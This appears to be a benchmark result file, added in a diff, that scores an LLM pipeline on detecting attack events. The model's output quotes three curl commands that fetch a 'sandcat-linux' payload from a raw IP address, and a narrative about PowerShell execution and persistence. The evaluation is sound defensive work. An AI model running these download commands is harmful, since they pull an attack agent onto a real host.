@@ -1,0 +1,64 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux;",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux;",
+        "stage": "Initial Access"
+      }
+    ],
+    "narrative": "Attackers initiated the compromise by downloading the `sandcat-linux` payload via multiple instances of curl commands. Following this initial access, they utilized SQL Server authentication to execute PowerShell scripts, enabling potential command and control capabilities. Subsequent manipulations of scheduled tasks and logout script deletions indicate efforts to maintain persistence while evading defenses.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 26927,
+      "completion_tokens": 13119,
+      "total_tokens": 40046,
+      "wall_clock_s": 252.732,
+      "parse_retries": 3
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 1.0,
+      "recall": 0.3333333333333333,
+      "f1": 0.5,
+      "tp": 3,
+      "fp": 0,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 1.0,
+      "recall": 0.3333333333333333,
+      "f1": 0.5,
+      "tp": 3,
+      "fp": 0,
+      "fn": 6,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 26927,
+      "completion_tokens": 13119,
+      "total_tokens": 40046,
+      "wall_clock_s": 252.732,
+      "parse_retries": 3
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
